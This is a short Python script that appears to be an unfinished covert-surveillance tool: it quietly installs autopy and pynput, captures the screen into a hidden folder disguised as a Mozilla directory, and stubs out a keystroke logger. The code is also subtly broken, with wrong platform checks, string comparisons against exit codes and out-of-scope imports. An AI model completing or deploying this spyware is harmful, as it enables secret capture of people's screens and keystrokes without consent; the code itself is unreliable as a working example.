#!/usr/bin/python3

#libraries
import os,platform, subprocess, sys, time

# install packages
def installSoft():
    if platform.system() == "win32": 
        if os.system('pip3 show autpy') == "autopy" and os.system('pip3 show pynput') == "pynput":
            pass
        else:
            os.system('pip3 -q install autopy pynput --user; ')
    elif platform.system() == "darwin":
        if os.system('pip3 -q list | grep autopy') == "autopy" and os.system('pip3 show pynput') == "pynput" :
            pass
        else:
            os.system('pip3 -q install autopy pynput --user; ')
    elif platform.system() == "Linux":
        if os.system('pip3 -q list | grep autopy') == "autopy" and os.system('pip3 -q list | grep pynput') == "pynput":
            pass
        else:
            os.system('pip3 -q install autopy pynput --user; ')
    else:
        print("Not a valid OS")
        quit() 
#functions

def screenshotsLinux():
    if print(os.path.isdir("/tmp/.mozilla")) == True:
        pass
    elif print(os.path.isdir("/tmp/.mozilla")) == False:
        os.mkdir('/tmp/.mozilla')
    else:
        pass
    b = autopy.bitmap.capture_screen()
    b.save("/tmp/.mozilla/ss.png")
    os.system('sleep 60')
    os.remove('/tmp/.mozilla/ss.png')

def screenshotsWin():
    os.mkdir(r'C:\tmp\mozilla')
    b = autopy.bitmap.capture_screen()
    b.save(r"C:\tmp\mozilla\ss.png")

def keystrokes():
    from pynput.keyboard import Key, Listener
    import logging


#checks what OS it is
def OScheck():
    if platform.system() == "win32":
        installSoft()
        import autopy, pynput 
        screenshotsWin()
        keystrokes()
    elif platform.system() == "darwin":
        installSoft()
        import autopy, pynput 
        screenshotsLinux()
        keystrokes() 
    elif platform.system() == "Linux":
        installSoft()
        import autopy, pynput 
        screenshotsLinux()
        keystrokes()
    else:
        print("Not a valid OS")
        quit()
OScheck()
